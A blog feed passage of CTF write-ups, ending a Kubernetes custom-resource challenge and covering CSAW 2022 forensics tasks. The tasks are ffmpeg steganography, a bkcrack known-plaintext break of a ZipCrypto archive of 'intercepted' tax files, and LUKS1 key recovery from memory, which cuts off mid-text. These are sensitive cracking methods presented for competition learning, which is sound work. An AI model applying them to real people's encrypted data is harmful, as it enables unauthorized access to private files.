href=\"#kubernetes-special\">#</a> Kubernetes: Special :</h2>\n<p>After getting the new token it’s time to edit the kubeconfig file! Just replace the old toke by the new one! To work with kubectl correctly!</p>\n<p><img data-src=\"https://imgur.com/iFClk1V.png\" alt=\"\"></p>\n<p>Something Special?? What a special? Everything in Kubernetes is SO Special!! So no worries, We can deal with that kind of things!</p>\n<p>Talking about something special take me to think about what we can call it  <code>Custom Resources Definition</code>  in Kubernetes!</p>\n<p>In Kubernetes, a custom resource is an extension of the Kubernetes API that allows you to define your own custom resources with their own custom controllers.</p>\n<p>A custom resource definition (CRD) is used to create a new custom resource type in Kubernetes. A CRD defines the structure and behavior of the new custom resource, including its name, attributes, and API endpoints. Once a CRD is defined, instances of the custom resource can be created and managed using Kubernetes tools like kubectl and the Kubernetes API.</p>\n<figure class=\"highlight bash\"><figcaption><span>api-resources</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl api-resources</span><br><span class=\"line\">NAME                              SHORTNAMES                                      APIVERSION                             NAMESPACED   KIND</span><br><span class=\"line\">bindings                                                                          v1                                     <span class=\"literal\">true</span>         Binding</span><br><span class=\"line\">componentstatuses                 cs                                              v1                                     <span class=\"literal\">false</span>        ComponentStatus</span><br><span class=\"line\">configmaps                        cm                                              v1                                     <span class=\"literal\">true</span>         ConfigMap</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">rolebindings                                                                      rbac.authorization.k8s.io/v1           <span class=\"literal\">true</span>         RoleBinding</span><br><span class=\"line\">roles                                                                             rbac.authorization.k8s.io/v1           <span class=\"literal\">true</span>         Role</span><br><span class=\"line\">priorityclasses                   pc                                              scheduling.k8s.io/v1                   <span class=\"literal\">false</span>        PriorityClass</span><br><span class=\"line\">ncscctfs                                                                          securinets.com/v1alpha1                <span class=\"literal\">true</span>         NCSCCtf</span><br></pre></td></tr></table></figure>\n<p>But wait! I am right! There is an api-group and a custom resource called ncscctfs!</p>\n<p>Now it’s time to get the flag!</p>\n<figure class=\"highlight bash\"><figcaption><span>get</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl get ncscctfs -n task4           </span><br><span class=\"line\">NAME   AGE</span><br><span class=\"line\">flag   17d</span><br></pre></td></tr></table></figure>\n<p>And yes there is a ncscctf resource named flag! Let’s describe that thing and get the flag!</p>\n<figure class=\"highlight bash\"><figcaption><span>describe</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl describe ncscctfs flag -n task4 </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://imgur.com/DhelAJU.png\" alt=\"\"></p>\n<p>Flag:  <code>Securinets&#123;CuSt0m_REs0urcEs_ArE_P0wErFul&#125;</code></p>\n<h1 id=\"final-words\"><a class=\"markdownIt-Anchor\" href=\"#final-words\">#</a> Final Words</h1>\n<p>In conclusion, the success of this event and competition is due in no small part to the dedication and hard work of the technical team. Their expertise and professionalism were instrumental in overcoming the various challenges we faced throughout the event lifecycle, and their tireless efforts ensured that we delivered a product that met the highest standards of quality and performance. On behalf of the team, I would like to express our sincere gratitude to our technical colleagues for their unwavering commitment to the project, and for their invaluable contributions to its success</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/12/Writeups/csaw2022/",
            "url": "http://example.com/2022/09/12/Writeups/csaw2022/",
            "title": "CSAW'2022 Forensics Writeup",
            "date_published": "2022-09-12T10:33:37.000Z",
            "content_html": "<p>CSAW CTF is one of the oldest and biggest CTFs in the world, with more than 900 teams participating in the 2022 edition. We would like to thank the organizers for the stable infrastructure and the creative challenges.</p>\n<p>we finished first in the MENA region and 14th globally</p>\n<p>Kudos to everyone in my team SOter14 for their huge work and efforts, you can catch up with out latest news at <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3RlcjE0LnRlY2g=\">our website</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9TT3RlcjE0VGVhbQ==\">twitter page</span></p>\n<p>The contest was fun and challenging, we managed to solve 25 out of the 28 challenges in Pwn, Web, OSINT, Forensics, Steganography, Misc, Quantum Computing, AI, Cryptography, and Reverse Engineering.</p>\n<p>Below are the writeups for forensics challs: Noir, Not Too Taxing (Crypto), and Encrypted disk.</p>\n<h1 id=\"noir-digital-forensics-steganography\"><a class=\"markdownIt-Anchor\" href=\"#noir-digital-forensics-steganography\">#</a> Noir: Digital Forensics / Steganography</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>I am a forest, and a night of dark trees: but he who is not afraid of my darkness, will find banks full of roses under my cypresses. Friedrich Nietzsche.</p>\n<p>The image contains a flag in the format (flag)this_is_the_flag</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQnVkYW1uZGdNNlRpb3l6VlhpY01LVkRqQTJGLUtVUHovdmlldz91c3A9c2hhcmluZw==\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQnVkYW1uZGdNNlRpb3l6VlhpY01LVkRqQTJGLUtVUHovdmlldz91c3A9c2hhcmluZw==\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Noir</p>\n          </div></div><div class=\"item\" title=\"Author - Wen Jun L.\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3dlbmpsLw==\" data-background-image=\"https://media-exp1.licdn.com/dms/image/C5603AQGZdulNxGshvg/profile-displayphoto-shrink_400_400/0/1602081502952?e=1668643200&v=beta&t=XeXg__QTpf__BhQHFkZD7sSsL7PeCEbEXdi-J66JfeU\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3dlbmpsLw==\">Author - Wen Jun L.</span>\n          <p class=\"desc\">Wen Jun L. Linkedin Profile</p>\n          </div></div></div>\n<p>This challenge blowed our minds, it was part of CSAW’21 Finals and it is a 0-solves chall, so it was offered in the Quals of 2022. We’ve got an image, bit heavy around 9 MB that looks like a scene from a horror game, storm, forest, and darkness. It was a twisted chall!</p>\n<p><img data-src=\"https://github.com/u91o/noir/blob/main/noir.png?raw=true\" alt=\"\"></p>\n<p>First, we tried the normal steganogrpahy ways around it, but obviously that is a total waster of time.</p>\n<p>It had 100+ on Aperisolve alone!</p>\n<p>Technically, the image is merely noise in the three RGB channels whith contrast on few areas, that when included with the alpha channel gives the image as you see it! Amazing, it really feels like some streaming technique, a kind of standard that’s used by TVs to show pictures we can understand. But we neglected the thought of getting a video out of an image, how unfair! Instead we’ve thought of the noise as a raw data that we can feed to Audacity and hopefully get an audible thing out of it, using U-LAW since we’re dealing with RAW data, it made much sense, because we have seen some images filled with noise turning into audio. But a video, insane!</p>\n<p><img data-src=\"https://i.imgur.com/dpalAg1.png\" alt=\"\"></p>\n<p>And of course, it was a video!</p>\n<p>Noir represents a kind of movies, black and white, crime generally, and that’s how we finally went into the idea that we’re dealing with a video rather than an audio.</p>\n<p>The Noir movies are taped to a stripe and played through a wheel showing still images 24 frames a second - Oh, keep that in mind! Still images mean also RAW data. That could help.</p>\n<p>But still we wonder, how to extract the video.<br>\nWell it can’t be manually, there must be a tool, or it would be a total nightmare.</p>\n<p>To save you some time, it was  <code>FFmpeg</code> !!</p>\n<p>FFmpeg is a free and open-source software project consisting of a suite of libraries and programs for handling video, audio, and other multimedia files and streams. At its core is the command-line ffmpeg tool itself, designed for processing of audiovisual files. Per Wikipedia.</p>\n<p>Well, that means some sort of conversion, right? Yep, but from a single png to what? There are hundreds of video formats out there, some of them are no longer being used.</p>\n<p>But we can narrow our results, to lightweight ones since the image is just 9 MB, 24 fps if that helps, RAW data, so no codecs!</p>\n<p>FFmpeg command to convert formats is basically:</p>\n<figure class=\"highlight bash\"><figcaption><span>ffmpeg command</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ffmpeg -i <span class=\"built_in\">source</span> -pix_fmt pixelformat  -f rawvideo - &gt; output.extension</span><br></pre></td></tr></table></figure>\n<p>You can specify the frames, although ffmpeg can pretty much detect that automatically.</p>\n<p>We need the pixelformat and the extension. We’re getting close!</p>\n<p>Hmm, since we’re dealing with an image, can’t the extension of the video we’re looking for be both an image extension and a video extension. WEBM answers that. How clever!</p>\n<p>Webm is actually the only extension we’ve found thats a Joker, can be an image/audio/video. Which makes it special. That’s it, by luck, we got it, WEBM.</p>\n<p>However we tried a lot of extenison, it was a game of trial and error, for instance we checked mp4, wmv, avi, mkv, flv, mov, you name it…</p>\n<p>FFmpeg needs a pixel format, well, there is a hude table of these formats…</p>\n<figure class=\"highlight bash\"><figcaption><span>pixels format</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name=     yuv420p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuyv422, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       rgb24, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       bgr24, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuv422p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuv444p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       rgb32, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=     yuv410p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     yuv411p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=      rgb565, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=      rgb555, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=        gray, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       monow, nb_channels=   1, depth=   1, is_alpha=n</span><br><span class=\"line\">name=       monob, nb_channels=   1, depth=   1, is_alpha=n</span><br><span class=\"line\">name=        pal8, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=    yuvj420p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=    yuvj422p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=    yuvj444p, nb_channels=   3, depth=   8, is_alpha=n</span><br><span class=\"line\">name=      xvmcmc, nb_channels=   0, depth=   0, is_alpha=n</span><br><span class=\"line\">name=    xvmcidct, nb_channels=   0, depth=   0, is_alpha=n</span><br><span class=\"line\">name=     uyvy422, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=   uyyvyy411, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=       bgr32, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=      bgr565, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=      bgr555, nb_channels=   3, depth=   5, is_alpha=n</span><br><span class=\"line\">name=        bgr8, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        bgr4, nb_channels=   1, depth=   4, is_alpha=n</span><br><span class=\"line\">name=   bgr4_byte, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        rgb8, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        rgb4, nb_channels=   1, depth=   4, is_alpha=n</span><br><span class=\"line\">name=   rgb4_byte, nb_channels=   1, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        nv12, nb_channels=   2, depth=   8, is_alpha=n</span><br><span class=\"line\">name=        nv12, nb_channels=   2, depth=   8, is_alpha=n</span><br><span class=\"line\">name=     rgb32_1, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=     bgr32_1, nb_channels=   4, depth=   8, is_alpha=y</span><br><span class=\"line\">name=    gray16be, nb_channels=   1, depth=  16, is_alpha=n</span><br><span class=\"line\">name=    gray16le, nb_channels=   1, depth=  16, is_alpha=n</span><br></pre></td></tr></table></figure>\n<p>Well, we didn’t guess, we, at this stage, after looking deeply into the image, and as said before, the RGB channels are carrying noise that surely represent the video, however the alpha channel is the one that shape the picture as we see it in the previews. So the pixel format we choose is rgb24 excluding the alpha channel.</p>\n<p>The final command is:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ffmpeg -i noir.png -pix_fmt rgb24  -f rawvideo - &gt; vid.webm</span><br></pre></td></tr></table></figure>\n<p>Coool, after all the hustle we’ve got a video, a subway with blinking lights, or should I say, Morse Code!<br>\nThe clock was ticking, we’re at the final hours of the CTF, and the video is 2 mins long.<br>\nCould there be any OpenCV tool for this! Of course, here is a link you might need it as well <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhemVyMjAxNS9Nb3JzZURlY29kZXI=\">MorseDecoder</span></p>\n<p>Here is a link for the video as well <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOU5TOTJXblZZMUlNbEc0aHlFWVh2c0U3MWpfbTFDcG8vdmlldz91c3A9c2hhcmluZw==\">video.webm</span></p>\n<p>Using the tool, I let it record my screen and positioned the cross selection on the train lights. Within a minute we’ve got the flag!</p>\n<p><img data-src=\"https://i.imgur.com/wh0uUv2.png\" alt=\"\"></p>\n<p>Finally, it was a creative challenge we must say!</p>\n<p>The flag is  <code>(flag)sil3nt_refl3ct1on</code></p>\n<h1 id=\"not-too-taxing-digital-forensics-cryptography\"><a class=\"markdownIt-Anchor\" href=\"#not-too-taxing-digital-forensics-cryptography\">#</a> Not Too Taxing: Digital Forensics / Cryptography</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>We intercepted some email communications between a tax consultant and his client that contained some important tax documents. We were able to successfully extract two of the documents, but we can’t figure out the password to the file in order to extract the data. Attached are the two extracted files, Tax_Ret_Form_Blank.pdf and Tax_Ret_Form_Nov_2021.zip, and a transcript of the emails we found, SPBlock_Email.pdf.</p>\n<p>Can you figure out the password so we can get this guy’s info?</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2RyaXZlL2ZvbGRlcnMvMXo1SGxYR1lhVnhtTndWbXhkRFhGQk9PSUFlZEt6c1pNP3VzcD1zaGFyaW5n\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2RyaXZlL2ZvbGRlcnMvMXo1SGxYR1lhVnhtTndWbXhkRFhGQk9PSUFlZEt6c1pNP3VzcD1zaGFyaW5n\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Not Too Taxing</p>\n          </div></div></div>\n<p>In this challenge we were given, an encrypted zip archive containing a filled state tax form document for the month of Novemeber 2021, the emails transmitted between … and the client, as well as the template of the tax form blank.</p>\n<p>We’ve noticed the zip was using the ZipCrypto Store compression, which is breakable if you can find 12 bytes of the data inside the zip, 8 of which got to be contiguous.</p>\n<p>ZipCrypto is considered as the legacy encryption of archives, you must be aware that it is the default method used in most Linux distros: ZipCrypto Deflate. Thus you might want to manually change that method when compressing to AES for higher security.</p>\n<p>The ZipCrypto algorithm generates a pseudo-random stream of bytes/keystream, which is XORed to the entry’s content. to produce the encrypted data. The generator’s state made of three 32-bits integers (keys), is initialized using the password and then contiuously updating as encryption goes on.</p>\n<p>This encryption algorithm is vulnerable to known plaintext attacks to recover the content fully.</p>\n<p>We’re going to use  <code>bkcrack</code>  tool which can recover the content of the archive, change a zip archive’s password, and recover the original password. All by retrieving the zip archive three generated keys.</p>\n<p>The installation is pretty straight forward, just git clone the repo then,</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmake -S . -B build -DCMAKE_INSTALL_PREFIX=install</span><br><span class=\"line\">cmake --build build --config Release</span><br><span class=\"line\">cmake --build build --config Release --target install</span><br></pre></td></tr></table></figure>\n<p>Well, we must use the blank tax form as our plaintext attack, as it shares a lot of identical bytes with the filled form inside the zip.</p>\n<p>However you can’t just feed the pdf to bkcrack and hope for it to crack the zip. The tool requires a non encrypted zip with the similar bytes inside to attack the encrypted zip.</p>\n<p>So let’s get our blank form inside a zip and specify the method of encryption as ZipCrypto and the compression level as store. Now we guarantee there are plenty of similar bytes to execute the attack.</p>\n<p><img data-src=\"https://i.imgur.com/ouMza3O.png\" alt=\"\"></p>\n<p>First we retrieve the three keys from the zip archive using</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack -C Tax_Ret_Form_Nov_2021.zip -c Tax_Ret_Form_Nov_2021.zip -P Tax_Ret_Blank.zip -p Tax_Ret_Form_Blank.pdf</span><br></pre></td></tr></table></figure>\n<p>-C: Specifies the encrypted zip archive<br>\n-c: Specifies the target file within the archive<br>\n-P: Specifies the plaintext zip archive<br>\n-p: specifies the plaintext file within the non encrypted archive.</p>\n<p>Now let it process for a while, it should not take long, as we provided more than enough data to bkcrack.</p>\n<p>Here are they keys I have got:</p>\n<figure class=\"highlight bash\"><figcaption><span>result</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b2c4a24e f036ff3a 998f6727</span><br></pre></td></tr></table></figure>\n<p>If the compression wasn’t Store, and instead it was Deflate, then the Github repo provides some python scripts to decompress those types, just first include  <code>-d deciphered</code>  at the end of the previous command.</p>\n<p>Then run:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 tools/inflate.py deciphered decompressed</span><br></pre></td></tr></table></figure>\n<p>In our case, it was just Store, so we move on to the next step, we’re going to recreate the very same archive with a password of our choise, this is the fastest way around Zip crypto archives, you can go ahead and retrieve the password, we will show that. However that process will take a bit longer.</p>\n<figure class=\"highlight plaintext\"><figcaption><span>command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack -C Tax_Ret_Form_Nov_2021.zip -k b2c4a24e f036ff3a 998f6727 -U unlocked.zip 1234</span><br></pre></td></tr></table></figure>\n<p>And within a second, we got our new archive with the filled document restored successfully!</p>\n<p><img data-src=\"https://i.imgur.com/8x38gOi.png\" alt=\"\"></p>\n<p>And the flag was:  <code>flag&#123;1f_y0u_u53_z1pcryp70_4ny0n3_c4n_aud17_y0u&#125;</code></p>\n<p>However if you want the hard way, you can retrieve the original password of the archive using the three keys, you might need to know the length though, or guess it. Tideous task…</p>\n<p>Anyways, here is the command you would use for that:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack -k b2c4a24e f036ff3a 998f6727 -r 8..12 ?p</span><br></pre></td></tr></table></figure>\n<p>-r to specify the length, it can be a rough number or an interval.</p>\n<p>Sorry, I didnt bother to get the password 😃)</p>\n<p>It was a creative challenge. However I must say that we did not check the email content document at all lol!</p>\n<h1 id=\"encrypted-disk-digital-forensics\"><a class=\"markdownIt-Anchor\" href=\"#encrypted-disk-digital-forensics\">#</a> Encrypted Disk: Digital Forensics</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>th31nk encrypted his disk and forgot the password, can you help him? Flag is what you find, no need to wrap</p>\n<p>HINT: Custom Profile</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xNnRJTHBaYTVHaXZZLVo4NGxybTg2VjhEQzVEV2FIemEvdmlldz91c3A9c2hhcmluZw==\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xNnRJTHBaYTVHaXZZLVo4NGxybTg2VjhEQzVEV2FIemEvdmlldz91c3A9c2hhcmluZw==\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Encrytped Disk</p>\n          </div></div><div class=\"item\" title=\"Author - Crazyman\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9DcmF6eW1hbkFybXk=\" data-background-image=\"https://pbs.twimg.com/profile_images/1427918895424282628/NR5jaECn_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9DcmF6eW1hbkFybXk=\">Author - Crazyman</span>\n          <p class=\"desc\">Crazyman Twitter Profile</p>\n          </div></div></div>\n<p>In this challenge we got a disk image &amp; a memory dump. The Description tell us that the user encrypted his disk and forgot the password! So we can understand that the memory dump will help us to decrypt the disk to get the flag! right?? Let’s Check what we have !</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ file *</span><br><span class=\"line\">forensic.img: LUKS encrypted file, ver 1 [aes, ecb, sha1] UUID: 61478c6d-b04e-4f1a-aff6-b4bb3a29cfbe</span><br><span class=\"line\">memory.raw:   data</span><br></pre></td></tr></table></figure>\n<p>As you see we have LUKS encrypted file version1! I will say it again! it’s verion 1!!!<br>\nOh wait what is LUKS??!</p>\n<p>LUKS or the Linux Unified Key Setup is a disk encryption specification created by Clemens Fruhwirth in 2004 and was originally intended for Linux.<br>\nWhile most disk encryption softwares implement different, incompatible, and undocumented formats, LUKS implements a platform-independent on-disk format for use in various tools. This not only faciliates compatibility and interoperability among different programs, but also assures that they all implement password management in a secure and documented manner. Per Wikipedia.</p>\n<p>Unlike most blogs say, you should stick with LUKS2 if you are applying it to your disk, since it provides an extra layer of security by storing the master key in the kernel directly. However LUKS1 masterkey gets loaded in the RAM when you try to unlock it, and that what we are going to grab from the memory dump!</p>\n<p>The encrypted master key is stored as plaintext in the LUKS header. However once we mount it and get prompted to enter a passphrase, at least one of eight (LUKS support up to 8 passphrases), the decrypted master key (AES) is loaded into the memory.</p>\n<p><img data-src=\"https://i.imgur.com/GOTSIPB.png\" alt=\"\"><br>\n<em>Image courtesy: MDPI</em></p>\n<p>When we tried to use <span class=\"exturl\" data-url=\"aHR0cDovL1ZvbGF0aWxpdHkucHk=\">Volatility.py</span> against the memory dump we had some troubles finding the right profile.</p>\n<p>We are sure that this memory image is linux one, because we have LUKS. Let’s figure out what is the distrubition and the version to search or make our volatility profile to work with!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ strings memory.ram | grep <span class=\"string\">&quot;Linux version&quot;</span></span><br><span class=\"line\">Linux version 4.4.0-72-lowlatency (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) <span class=\"comment\">#93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)</span></span><br></pre></td></tr></table></figure>\n<p>Oh it’s <span class=\"pinky\">Ubuntu 16.04.4</span> with low-latency kernel! oh wait what? what did you mean by low-latency kernel?<br>\nAs I know there is various type of linux kernel like Real-tim kernel, generic kernel, Low-latency kernel<br>\nThis types of kernel varies in the type of the scheduler and their algorithm, as well as the system interuption… etc! None is better than the other! Each one has its use case.</p>\n<p>For example the low-latency one can reduce audio latency and the context switches are more frequent. This type of kernel has a scheduler that is not suitable for a server environment! But it will be good for a professional audio or video editing!</p>\n<p>Ok now i guess you get it ! It’s time to make our profile! In this demo we will make a volatility profile with low-latency kernel using docker container. It’s better than downloading a whole VM! Don’t waste time in that!</p>\n<p>Let’s download volatiltiy man</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ git <span class=\"built_in\">clone</span> https://github.com/volatilityfoundation/volatility</span><br><span class=\"line\">Cloning into <span class=\"string\">&#x27;volatility&#x27;</span>...</span><br><span class=\"line\">remote: Enumerating objects: 27411, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Cceiving objects:   7% (1919/27411), 340.01 KiB | 652.00 KiB/s</span><br></pre></td></tr></table></figure>\n<p>In Volatility repository there is  <code>/tools/linux</code>  directory that contains tools that allow us to make a linux profile. In this directory there is a file called <span class=\"pinky\">Makefile</span> that contains important information ! Let’s check it!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~volatility/tools/linux/$ <span class=\"built_in\">cat</span> Makefile</span><br><span class=\"line\">obj-m += module.o</span><br><span class=\"line\">KDIR ?= /</span><br><span class=\"line\">KVER ?= $(shell <span class=\"built_in\">uname</span> -r)</span><br><span class=\"line\"></span><br><span class=\"line\">-include version.mk</span><br><span class=\"line\"></span><br><span class=\"line\">all: dwarf</span><br><span class=\"line\"></span><br><span class=\"line\">dwarf: module.c</span><br><span class=\"line\">        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build CONFIG_DEBUG_INFO=y M=<span class=\"string\">&quot;<span class=\"subst\">$(PWD)</span>&quot;</span> modules</span><br><span class=\"line\">        dwarfdump -di module.ko &gt; module.dwarf</span><br><span class=\"line\">        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build M=<span class=\"string\">&quot;<span class=\"subst\">$(PWD)</span>&quot;</span> clean</span><br><span class=\"line\"></span><br><span class=\"line\">clean:</span><br><span class=\"line\">        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build M=<span class=\"string\">&quot;<span class=\"subst\">$(PWD)</span>&quot;</span> clean</span><br><span class=\"line\">        <span class=\"built_in\">rm</span> -f module.dwarf</span><br></pre></td></tr></table></figure>\n<p>Look at the  <code>KVER</code>  variable , it contains your current kernel version! it’s an automatic kernel detection! in our case we will change it with the version of kernel that we will use it! Check the Linux Version from the output of the last strings command that we runed on the memory dump.<br>\nchange  <code>$(shell uname -r)</code>  with  